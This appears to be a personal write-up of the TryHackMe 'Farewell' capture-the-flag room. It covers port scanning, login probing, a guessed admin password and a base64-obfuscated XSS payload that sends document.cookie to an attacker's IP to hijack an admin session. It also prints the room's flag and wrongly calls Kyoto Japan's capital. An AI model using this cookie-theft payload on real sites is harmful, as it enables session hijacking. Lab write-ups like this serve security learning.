---
created: 2026-01-18
tags:
  - note
  - journal
  - cyberStuff
title: Farewell
draft: false
date:
subiect:
  - waf 
  - web
  - prisEsc
dificultate: 3
amuca: true
link:
  - https://tryhackme.com/room/farewell
lastmod: 2026-10-09T12:35:50.045Z
---
# Recon

Let's start with the basics to see what ports are open.\
Let's scan the ports with nmap and the -sS flag:\
-sS means TCP SYN (Half-Open) scan; it is a fast and stealthy scan that scans for TCP SYN.\
https://en.wikipedia.org/wiki/Transmission\_Control\_Protocol\
https://en.wikipedia.org/wiki/SYN

![](/images/static/Pasted%20image%2020260118094415.png)\
Very basic ports open: SSH and HTTPS. Let's check the site:

![](/images/static/Pasted%20image%2020260118094453.png)\
Nothing interesting here, just a basic login page:\
![](/images/static/Pasted%20image%2020260118145315.png)\
Apart from that, we can find an interesting banner at the top of the site with some active users; maybe we can try some of them as usernames.

Let's try a basic subdirectory enumeration; maybe something interesting shows up:

![](/images/static/Pasted%20image%2020260118100108.png)\
OK, really good; we have some interesting HTTP status codes here:

Let's intercept the request with Burp Suite:

![](/images/static/Pasted%20image%2020260118101550.png)\
Now let's try to log in:\
![](/images/static/Pasted%20image%2020260118102022.png)\
I intercepted it and sent it to Repeater, and we see error=auth\_failed:

Trying a username from above and a random password, I get the following:\
![](/images/static/Pasted%20image%2020260118145649.png)\
Let's try some other usernames too:\
![](/images/static/Pasted%20image%2020260118145721.png)\
OK, cool:\
Let's try deliver11 as well:\
![](/images/static/Pasted%20image%2020260118145757.png)\
OK cool, this gives us a hint for the password.\
The capital of Japan is Kyoto, so the format will be KyotoXXXX where X is a digit.

I guess we will try to brute-force it.

Reconsidering it and taking into account the WAF, brute-forcing XXXX will take quite some time, so let's try something for admin.

After a few tries, I got lucky and found "Farewell2025!".

Logging in with that password, we get:\
![](/images/static/Pasted%20image%2020260118150802.png)\
So there is the flag.\
Note: this is the flag for a normal user.

For the second flag, we will try the same approach we used for the second WAF CTF: using eval and atob functions.

The payload is:

```html
<body onload="eval(atob('ZmV0Y2goJy8vMTkyLjE2OC4xNDUuNC8nK2RvY3VtZW50LmNvb2tpZSk='))">
```

where the encoded part is:\
`fetch('//YourIP/'+document.cookie)`

And by pasting the payload into the post section, we get the second cookie just like that:

![](/images/static/Pasted%20image%2020260118152529.png)

![](/images/static/Pasted%20image%2020260118152610.png)\
And by changing our cookie with that, we get:\
Note: you have to change the cookie on the admin.php page.

![](/images/static/Pasted%20image%2020260118153156.png)

FLAG: THM{ADMINP@wned007}
